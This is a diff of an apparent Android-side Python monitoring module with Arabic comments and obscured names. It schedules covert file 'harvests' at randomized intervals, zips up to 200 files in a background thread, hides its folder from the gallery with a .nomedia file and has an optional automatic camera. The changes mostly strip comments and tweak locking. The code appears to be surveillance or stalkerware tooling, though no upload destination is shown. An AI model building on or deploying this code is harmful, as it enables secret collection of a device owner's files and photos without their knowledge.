@@ -5,7 +5,6 @@ import json
 import random
 import threading
 import logging
-import gc
 import hashlib
 from datetime import datetime, timedelta
 
@@ -39,37 +38,28 @@ except ImportError:
 def _parse_iso_datetime(iso_string):
     """
     فك تشفير تاريخ ISO بشكل آمن (متوافق مع Python 3.6+)
-    يدعم التنسيقات التالية:
-    - 2024-01-15T14:30:00
-    - 2024-01-15T14:30:00.123456
-    - 2024-01-15 14:30:00
-    - 2024-01-15T14:30:00Z (يتعامل مع Z كـ UTC)
     """
     if not iso_string or not isinstance(iso_string, str):
         return None
-    
+
     iso_string = iso_string.strip()
     if not iso_string:
         return None
-    
-    # استبدال Z بـ +00:00 للتوافق مع fromisoformat في Python 3.7+
+
     iso_string = iso_string.replace('Z', '+00:00')
-    
-    # محاولة التحليل باستخدام fromisoformat (Python 3.7+)
+
     try:
         return datetime.fromisoformat(iso_string)
     except (ValueError, AttributeError):
         pass
-    
-    # محاولة تنسيقات أخرى للتوافق مع Python 3.6 والإصدارات الأقدم
+
     for fmt in ("%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
         try:
-            # قص الجزء الزمني إذا كان موجوداً
             clean_str = iso_string[:19] if len(iso_string) >= 19 else iso_string
             return datetime.strptime(clean_str, fmt)
         except ValueError:
             continue
-    
+
     logging.warning(f"Could not parse datetime: {iso_string}")
     return None
 
@@ -77,9 +67,9 @@ def _parse_iso_datetime(iso_string):
 class M:
     def __init__(self):
         self.d = P
-        self.cf = os.path.join(self.d, "c.json")  # ملف الإعدادات
-        self.lh = os.path.join(self.d, "lh")      # آخر وقت حصاد
-        self.wt = os.path.join(self.d, "wt")      # وقت الحصاد القادم
+        self.cf = os.path.join(self.d, "c.json")
+        self.lh = os.path.join(self.d, "lh")
+        self.wt = os.path.join(self.d, "wt")
 
         self.rn = True
         self.did = None
@@ -106,7 +96,6 @@ class M:
     def _setup(self):
         """إعداد المجلدات والملفات الأولية"""
         try:
-            # إنشاء .nomedia لإخفاء المجلد من المعرض
             nomedia_path = os.path.join(self.d, ".nomedia")
             if not os.path.exists(nomedia_path):
                 with open(nomedia_path, 'w') as f:
@@ -114,26 +103,25 @@ class M:
         except:
             pass
 
-        # التأكد من وجود وقت حصاد قادم صحيح
         self._ensure_next_harvest_time()
 
     # ========== إدارة الإعدادات ==========
     def _load_config(self):
         """تحميل الإعدادات مع قيم افتراضية محسّنة"""
         default_cfg = {
-            "hth": 15,                         # عتبة البطارية (%)
-            "wl": False,                       # Wake lock
-            "iv": 900,                         # فاصل الفحص (ثانية) = 15 دقيقة
-            "harvest_min_interval": 7200,      # 2 ساعات كحد أدنى بين الحصادات
-            "harvest_random_hours_min": 2,     # أقل عدد ساعات للتأخير العشوائي
-            "harvest_random_hours_max": 6,     # أقصى عدد ساعات للتأخير العشوائي
-            "auto_camera": False,              # تفعيل الكاميرا التلقائية
-            "camera_interval": 3600,           # فاصل الكاميرا (ثانية) = ساعة
-            "max_harvest_files": 200,          # الحد الأقصى للملفات في الحصاد
-            "force_harvest_on_start": False,   # تشغيل حصاد فوري عند بدء التشغيل
-            "scan_on_start": True,             # تشغيل الماسح عند بدء التشغيل
-            "min_wifi_strength": -80,          # أقل قوة إشارة WiFi مقبولة (dBm)
-            "enable_auto_harvest": True        # تمكين الحصاد التلقائي
+            "hth": 15,
+            "wl": False,
+            "iv": 900,
+            "harvest_min_interval": 7200,
+            "harvest_random_hours_min": 2,
+            "harvest_random_hours_max": 6,
+            "auto_camera": False,
+            "camera_interval": 3600,
+            "max_harvest_files": 200,
+            "force_harvest_on_start": False,
+            "scan_on_start": True,
+            "min_wifi_strength": -80,
+            "enable_auto_harvest": True
         }
 
         if os.path.exists(self.cf):
@@ -150,7 +138,6 @@ class M:
             self._save_config()
 
     def _save_config(self):
-        """حفظ الإعدادات إلى الملف"""
         try:
             with open(self.cf, 'w', encoding='utf-8') as f:
                 json.dump(self.cfg, f, indent=2, ensure_ascii=False)
@@ -227,11 +214,6 @@ class M:
 
     # ========== إدارة وقت الحصاد (محسّن) ==========
     def _set_next_harvest_time(self, hours=None):
-        """
-        تحديد وقت الحصاد القادم بشكل عشوائي.
-        إذا لم يُحدد hours، يتم اختيار عدد ساعات عشوائي بين
-        harvest_random_hours_min و harvest_random_hours_max من الإعدادات.
-        """
         try:
             if hours is None:
                 min_h = self.cfg.get('harvest_random_hours_min', 2)
@@ -250,12 +232,10 @@ class M:
             return None
 
     def _ensure_next_harvest_time(self):
-        """التأكد من وجود وقت حصاد قادم صحيح (إنشاء أو تصحيح إذا لزم الأمر)"""
         if not os.path.exists(self.wt):
             self._set_next_harvest_time()
             return True
 
-        # التحقق من صحة الوقت
         try:
             with open(self.wt, 'r', encoding='utf-8') as f:
                 time_str = f.read().strip()
@@ -265,7 +245,6 @@ class M:
 
             next_time = _parse_iso_datetime(time_str)
             if next_time is None or next_time < datetime.now():
-                # الوقت منتهي أو غير صالح، نعيد تعيينه
                 logging.warning("Next harvest time is invalid or expired, resetting...")
                 self._set_next_harvest_time()
                 return True
@@ -277,7 +256,6 @@ class M:
         return True
 
     def _update_last_harvest_time(self):
-        """تسجيل وقت آخر حصاد ناجح"""
         try:
             with open(self.lh, 'w', encoding='utf-8') as f:
                 f.write(datetime.now().isoformat())
@@ -285,14 +263,9 @@ class M:
             logging.error(f"Update last harvest error: {e}")
 
     def _can_harvest(self, force=False):
-        """
-        التحقق مما إذا كان مسموحاً بالحصاد.
-        إذا force=True، يتم تجاهل جميع القيود الزمنية.
-        """
         if force:
             return True, "Forced"
 
-        # 1. التحقق من وقت الانتظار (ملف wt)
         if os.path.exists(self.wt):
             try:
                 with open(self.wt, 'r', encoding='utf-8') as f:
@@ -303,7 +276,6 @@ class M:
             except Exception as e:
                 logging.error(f"Can harvest (wt) error: {e}")
 
-        # 2. التحقق من الحد الأدنى بين الحصادات (ملف lh)
         if os.path.exists(self.lh):
             try:
                 with open(self.lh, 'r', encoding='utf-8') as f:
@@ -319,7 +291,6 @@ class M:
         return True, "OK"
 
     def get_next_harvest_time(self):
-        """إرجاع وقت الحصاد القادم كـ datetime أو None"""
         if os.path.exists(self.wt):
             try:
                 with open(self.wt, 'r', encoding='utf-8') as f:
@@ -337,12 +308,10 @@ class M:
             logging.debug("Auto-harvest is disabled")
             return
 
-        if self._harvest_running:
-            logging.debug("Harvest already running, skipping")
-            return
-
+        # استخدام قفل لمنع التشغيل المتزامن
         with self._harvest_lock:
             if self._harvest_running:
+                logging.debug("Harvest already running, skipping")
                 return
             self._harvest_running = True
 
@@ -369,6 +338,7 @@ class M:
             harvest_success = False
             if self.daily_zipper and hasattr(self.daily_zipper, 'run'):
                 try:
+                    # تشغيل الحصاد في خيط منفصل حتى لا يحجب المراقبة
                     threading.Thread(target=self.daily_zipper.run, daemon=True).start()
                     harvest_success = True
                     logging.info("Harvest triggered successfully")
@@ -382,7 +352,6 @@ class M:
                 self._set_next_harvest_time()
                 self._update_last_harvest_time()
             else:
-                # في حال فشل الحصاد، نعيد تعيين الوقت بعد فترة قصيرة
                 if not force:
                     logging.warning("Harvest failed, rescheduling in 1 hour")
                     self._set_next_harvest_time(hours=1)
@@ -398,7 +367,6 @@ class M:
             logging.error(f"Harvest logic error: {e}")
         finally:
             self._harvest_running = False
-            gc.collect()
 
     # ========== الكاميرا التلقائية ==========
     def _camera_logic(self):
@@ -519,6 +487,10 @@ class M:
         else:
             logging.warning(f"Unknown config key: {key}")
             return False
+
+    def is_harvesting(self):
+        """التحقق مما إذا كان الحصاد قيد التشغيل"""
+        return self._harvest_running
 
     def get_status(self):
         """الحصول على حالة المراقبة (للتصحيح)"""
